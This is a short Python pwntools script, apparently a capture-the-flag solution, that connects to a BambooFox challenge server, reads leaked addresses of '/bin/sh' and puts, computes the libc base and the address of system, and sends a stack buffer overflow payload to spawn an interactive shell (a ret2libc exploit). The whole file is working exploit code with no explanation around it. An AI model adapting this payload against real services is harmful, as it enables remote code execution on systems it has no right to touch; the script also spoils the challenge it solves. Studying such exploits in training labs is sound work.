from pwn import *

r = remote("bamboofox.cs.nctu.edu.tw",11002)

r.recvuntil("The address of \"/bin/sh\" is ")
sh = int(r.recvline()[:-1],16)
print hex(sh)
r.recvuntil("The address of function \"puts\" is ")
puts = int(r.recvline()[:-1],16)
print hex(puts)

base = puts - 0x64da0
system = base + 0x3fe70
r.sendline("a"*32 + p32(system) + "aaaa" + p32(sh))
r.interactive()
